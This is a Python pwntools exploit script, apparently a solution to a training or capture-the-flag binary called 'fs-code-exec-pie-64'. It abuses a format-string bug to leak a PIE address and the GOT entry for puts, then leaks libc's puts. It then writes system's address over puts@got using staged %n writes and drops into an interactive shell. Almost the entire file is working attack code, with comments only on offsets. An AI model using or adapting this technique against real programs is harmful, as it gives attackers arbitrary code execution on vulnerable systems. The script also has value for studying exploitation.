#!/usr/bin/env python

from pwn import *

p = process('./fs-code-exec-pie-64')

"""
context.terminal = ['tmux', 'splitw', '-h']
p = process('./gs-code-exec-pie-64')
gdb.attach(p)
"""

#Step 1: leak got of puts
print(p.recv(timeout=0.1))
p.sendline("%42$pAAA") #leaks a value that is 0x238 off of puts@got

data = p.recv()
print(repr(data))
base = int(data[8:20], 16)
print("Base addr: " + hex(base))
offset = 0x5584bc039020 - 0x5584bc038df8
print("Offset: " + hex(offset))
gotPuts = base + offset
print("gotPrintf: " + hex(gotPuts))

#Step 2: leak libc puts
print(p.recv(timeout = 0.1))
p.sendline("%7$sAAAA" + p64(gotPuts))

data = p.recv()
print(repr(data))

libcPuts = data[14:20]
print(repr(libcPuts))
libcPuts = u64(libcPuts + "\x00\x00")
print("libcPuts: " + hex(libcPuts))

#Step 3: overwrite puts with system
"""
pwndbg> print puts
$1 = {<text variable, no debug info>} 0x7fc24fe66690 <_IO_puts>
pwndbg> print system
$2 = {<text variable, no debug info>} 0x7fc24fe3c390 <__libc_system>
"""

system = libcPuts - 0x7fc24fe66690 + 0x7fc24fe3c390
print("System: " + hex(system))

lower16 = system & 0xffff
mid16 = system >> 16 & 0xffff
upper16 = system >> 32 & 0xffff
print("Low: " + hex(lower16))
print("Mid: " + hex(mid16))
print("Upp: " + hex(upper16))

first = lower16

second = mid16 - lower16
while second < 0:
    second += 0x10000

third = upper16 - mid16
while third < 0:
    third += 0x10000

fourth = 0x10000 - upper16

print("First: " + hex(first))
print("Second: " + hex(second))
print("Third: " + hex(third))
print("Fourth: " + hex(fourth))

buf = "%" + "%05d" % first + "x"
buf += "%12$n"
buf += "%" + "%05d" % second + "x"
buf += "%13$n"
buf += "%" + "%05d" % third + "x"
buf += "%14$n"
buf += "%" + "%05d" % fourth + "x"
buf += "%15$n"

print(len(buf))

buf += p64(gotPuts)
buf += p64(gotPuts + 2)
buf += p64(gotPuts + 4)
buf += p64(gotPuts + 6)

p.sendline(buf)
p.interactive()
